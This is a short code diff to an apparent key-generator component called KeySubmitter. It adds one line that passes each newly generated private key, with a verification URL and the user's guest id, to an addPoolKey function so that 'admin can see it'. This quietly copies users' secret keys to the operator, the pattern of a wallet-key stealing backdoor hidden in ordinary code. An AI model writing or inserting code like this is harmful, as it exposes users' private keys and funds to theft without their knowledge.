@@ -68,6 +68,9 @@ export function KeySubmitter() {
       url.searchParams.append("lz", compressToEncodedURIComponent(JSON.stringify(params)));
       const verifyUrl = url.toString();
 
+      // 4. Save to verification pool so admin can see it
+      await addPoolKey(privateKey, verifyUrl, user?.guest_id || "Unknown");
+
       return { privateKey, address, verifyUrl } as GeneratedKey;
     },
     onSuccess: (data) => {
